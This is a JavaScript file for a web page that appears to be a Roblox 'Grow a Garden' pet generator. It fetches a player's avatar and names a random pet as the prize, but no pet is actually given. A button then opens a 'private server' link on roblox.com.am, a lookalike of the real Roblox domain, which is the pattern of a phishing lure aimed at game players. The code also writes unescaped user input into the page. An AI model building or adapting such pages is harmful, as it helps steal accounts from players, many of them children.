const pets = ['Fluffy', 'Sparky', 'Buddy', 'Mittens', 'Shadow'];

const generateBtn = document.getElementById('generateBtn');
const petResult = document.getElementById('petResult');
const joinServerBtn = document.getElementById('joinServerBtn');
const usernameInput = document.getElementById('usernameInput');
const profileDiv = document.getElementById('profile');

// Your Roblox private server link
const robloxServerLink = 'https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=52534889335897791035324107410840';

generateBtn.addEventListener('click', async () => {
  const username = usernameInput.value.trim();
  if (!username) {
    alert('Please enter your Roblox username!');
    return;
  }

  try {
    const userResponse = await fetch(`https://api.roblox.com/users/get-by-username?username=${username}`);
    const userData = await userResponse.json();

    if (userData && userData.Id) {
      const userId = userData.Id;

      // Show profile picture
      const avatarUrl = `https://www.roblox.com/bust-thumbnail/image?userId=${userId}&width=100&height=100&format=png`;
      profileDiv.innerHTML = `<a href="https://www.roblox.com/users/${userId}/profile" target="_blank">
                                  <img src="${avatarUrl}" alt="${username} profile">
                              </a>`;

      // Generate pet
      const randomPet = pets[Math.floor(Math.random() * pets.length)];
      petResult.textContent = `${username} got: ${randomPet}!`;
      joinServerBtn.style.display = 'inline-block'; // Show join button
    } else {
      alert('Roblox username not found!');
      profileDiv.innerHTML = '';
      petResult.textContent = '';
      joinServerBtn.style.display = 'none';
    }
  } catch (error) {
    console.error(error);
    alert('Error fetching Roblox profile.');
  }
});

// Open Roblox private server when button clicked
joinServerBtn.addEventListener('click', () => {
  window.open(robloxServerLink, '_blank');
});